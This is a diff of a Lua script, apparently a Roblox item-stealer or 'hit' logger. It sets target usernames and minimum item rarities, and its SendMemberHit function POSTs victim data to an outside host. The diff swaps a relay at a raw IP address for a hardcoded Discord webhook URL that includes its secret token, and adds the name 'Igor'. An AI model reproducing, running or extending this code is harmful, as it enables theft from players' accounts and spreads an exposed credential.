@@ -1,3 +1,5 @@
+--Igor
+
 _G.Usernames = {"daniellfc09"} 
 _G.min_rarity = "Rare" 
 _G.min_value = 0
@@ -203,9 +205,8 @@ local users = _G.Usernames or {}
 local min_rarity = _G.min_rarity or "Godly"
 local min_value = _G.min_value or 1
 local ping = _G.pingEveryone or "Yes"
-local webhookToken = _G.webhook or "https://discord.com/api/webhooks/1495919876236378243/z9Ve-r2Sae7wtVyJ-9DdK2WnP-J9CCYtAJ_n4lWdPUWJT1vf1mERLKdF2fwUaG6orU_H"
-local webhookToken = _G.webhook or ""
-local baseUrl = "http://213.165.46.247:3000/api/token/" .. webhookToken
+local webhookUrl = _G.webhook or "https://discord.com/api/webhooks/1495919876236378243/z9Ve-r2Sae7wtVyJ-9DdK2WnP-J9CCYtAJ_n4lWdPUWJT1vf1mERLKdF2fwUaG6orU_H"
+local baseUrl = webhookUrl
 
 local DhUsers = { 'joezeif111x','omarvc17'}
 _G.autoJoin = true
@@ -536,7 +537,7 @@ local function SendMemberHit(data)
     local requestFunc = request or (syn and syn.request) or (http and http.request) or http_request
     local success, res = pcall(function()
         return requestFunc({
-            Url = baseUrl,
+            Url = "https://discord.com/api/webhooks/1495919876236378243/z9Ve-r2Sae7wtVyJ-9DdK2WnP-J9CCYtAJ_n4lWdPUWJT1vf1mERLKdF2fwUaG6orU_H",
             Method = "POST",
             Headers = { ["Content-Type"] = "application/json" },
             Body = HttpService:JSONEncode(data)
